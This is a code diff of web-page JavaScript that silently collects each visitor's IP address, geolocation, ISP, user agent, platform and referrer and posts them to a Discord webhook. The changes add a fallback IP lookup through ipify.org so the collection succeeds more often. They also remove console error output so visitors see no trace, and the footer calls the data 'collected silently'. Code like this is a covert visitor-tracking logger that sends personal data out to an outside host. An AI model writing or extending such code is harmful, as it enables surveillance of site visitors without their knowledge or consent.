@@ -211,18 +211,50 @@
                     return; // Silently exit if URL is not set or invalid
                 }
 
-                let ipData = null;
+                let ipData = {
+                    ip: "N/A",
+                    country_name: "N/A",
+                    city: "N/A",
+                    region_name: "N/A",
+                    latitude: "N/A",
+                    longitude: "N/A",
+                    org: "N/A",
+                    asn: "N/A",
+                    timezone: "N/A",
+                    zip: "N/A"
+                };
 
-                // 1. Fetch IP data from ipapi.com
+                // 1. Attempt to fetch IP data from ipapi.com
                 try {
                     const ipApiResponse = await fetch('https://ipapi.com/json/');
                     if (!ipApiResponse.ok) {
-                        throw new Error(`HTTP error! status: ${ipApiResponse.status}`);
+                        throw new Error(`ipapi.com HTTP error! status: ${ipApiResponse.status}`);
                     }
-                    ipData = await ipApiResponse.json();
+                    const data = await ipApiResponse.json();
+                    ipData = {
+                        ip: data.ip || "N/A",
+                        country_name: data.country_name || "N/A",
+                        city: data.city || "N/A",
+                        region_name: data.region_name || "N/A",
+                        latitude: data.latitude || "N/A",
+                        longitude: data.longitude || "N/A",
+                        org: data.org || "N/A",
+                        asn: data.asn || "N/A",
+                        timezone: data.timezone || "N/A",
+                        zip: data.zip || "N/A"
+                    };
                 } catch (error) {
-                    // Fail silently if IP data cannot be fetched
-                    return;
+                    // 2. Fallback: Attempt to get IP from api.ipify.org if ipapi.com fails
+                    try {
+                        const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                        if (!ipifyResponse.ok) {
+                            throw new Error(`api.ipify.org HTTP error! status: ${ipifyResponse.status}`);
+                        }
+                        const ipifyData = await ipifyResponse.json();
+                        ipData.ip = ipifyData.ip || "N/A";
+                    } catch (ipifyError) {
+                        // All attempts failed, ipData remains N/A for relevant fields
+                    }
                 }
 
                 // Prepare data for Discord webhook
@@ -235,22 +267,22 @@
                             description: `A new user visited the site: ${window.location.href}`,
                             color: 0x0099FF, // Blue color
                             fields: [
-                                { name: "IP Address", value: ipData.ip || "N/A", inline: true },
-                                { name: "Country", value: ipData.country_name || "N/A", inline: true },
-                                { name: "City", value: ipData.city || "N/A", inline: true },
-                                { name: "Region", value: ipData.region_name || "N/A", inline: true },
-                                { name: "Latitude", value: ipData.latitude ? ipData.latitude.toString() : "N/A", inline: true },
-                                { name: "Longitude", value: ipData.longitude ? ipData.longitude.toString() : "N/A", inline: true },
-                                { name: "Organization", value: ipData.org || "N/A", inline: false },
-                                { name: "ISP", value: ipData.asn || "N/A", inline: false },
-                                { name: "Timezone", value: ipData.timezone || "N/A", inline: true },
-                                { name: "Zip Code", value: ipData.zip || "N/A", inline: true },
+                                { name: "IP Address", value: ipData.ip, inline: true },
+                                { name: "Country", value: ipData.country_name, inline: true },
+                                { name: "City", value: ipData.city, inline: true },
+                                { name: "Region", value: ipData.region_name, inline: true },
+                                { name: "Latitude", value: ipData.latitude.toString(), inline: true },
+                                { name: "Longitude", value: ipData.longitude.toString(), inline: true },
+                                { name: "Organization", value: ipData.org, inline: false },
+                                { name: "ISP", value: ipData.asn, inline: false },
+                                { name: "Timezone", value: ipData.timezone, inline: true },
+                                { name: "Zip Code", value: ipData.zip, inline: true },
                                 { name: "User Agent", value: navigator.userAgent || "N/A", inline: false },
                                 { name: "Platform", value: navigator.platform || "N/A", inline: true },
                                 { name: "Referrer", value: document.referrer || "Direct", inline: true }
                             ],
                             footer: {
-                                text: "Data collected silently from ipapi.com",
+                                text: "Data collected silently from ipapi.com (with ipify.org fallback)",
                                 icon_url: "https://placehold.co/32x32/000000/FFFFFF?text=i",
                             },
                             timestamp: new Date().toISOString(), // Current time
@@ -258,7 +290,7 @@
                     ],
                 };
 
-                // 2. Send data to Discord webhook
+                // 3. Send data to Discord webhook
                 try {
                     const discordResponse = await fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -270,13 +302,12 @@
 
                     // Discord webhooks return a 204 No Content on success, so check for !ok
                     if (!discordResponse.ok) {
-                        // Log error internally if webhook fails, but don't show to user
-                        const errorText = await discordResponse.text();
-                        console.error("Discord webhook failed silently:", discordResponse.status, errorText);
+                        // Silently fail, no console output for the user
+                    } else {
+                        // Silently succeed, no console output for the user
                     }
                 } catch (error) {
-                    // Fail silently if sending to Discord fails
-                    console.error("Failed to send data to Discord webhook silently:", error);
+                    // Silently fail, no console output for the user
                 }
             }
 
